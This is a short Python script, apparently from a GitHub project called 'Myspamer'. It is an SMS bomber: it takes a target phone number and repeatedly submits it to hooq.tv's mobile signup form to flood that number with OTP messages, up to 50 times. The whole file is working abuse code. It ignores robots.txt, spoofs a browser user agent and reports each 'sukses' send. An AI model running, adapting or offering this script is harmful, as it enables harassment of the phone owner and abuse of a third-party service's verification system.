#!/usr/bin/python
# Coded by Senja
# Github: github.com/theaixtynine/Myspamer

try:
        import mechanize, os, sys, time

        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_gzip(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        br.addheaders = [("User-Agent","Mozilla/8.0 (Linux; U; Android 8.1)")]

        def send(no):
                br.open('https://authenticate.hooq.tv/signupmobile?returnUrl=https://m.hooq.tv%2Fauth%2Fverify%2Fev%2F%257Cdiscover&serialNo=c3125cc0-f09d-4c7f-b7aa-6850fabd3f4e&deviceType=webClient&modelNo=webclient-aurora&deviceName=webclient-aurora/production-4.2.0&deviceSignature=02b480a474b7b2c2524d45047307e013e8b8bc0af115ff5c3294f787824998e7')
                br.select_form(nr=0)
                br.form["mobile"] = no
                #br.form["password"] = "KangNewbieNoobea"
                res=br.submit().read()
                #print(res)
                if 'confirmotp' in str(res):
                        print(i+1,"sukses mengirim OTP")
                else: print(i+1,"gagal mengirim OTP")
                #return True
        no=int(input("\033[0m[\033[0m\033[1;32m+\033[0m] \033[1;77mInput No target: \033[0m"))
        jlm=int(input("\033[0m[\033[0m\033[1;35m?\033[0m] \033[1;77mCount: \033[0m"))
        print
        if jlm > 50:
                print
                exit("\033[0m[\033[0m\033[1;31m!\033[0m] \033[1;77mExit the program")
        for i in range(jlm):
                send(str(no))
                time.sleep(1)

except KeyboardInterrupt: exit("\033[0m[\033[1;31m Exit \033[0m] \033[1;77mkey interrupt")
except Exception as F: print("\033[0m[\033[0m\033[1;31m!\033[0m] \033[1;77mError: \033[0m%s"%(F))
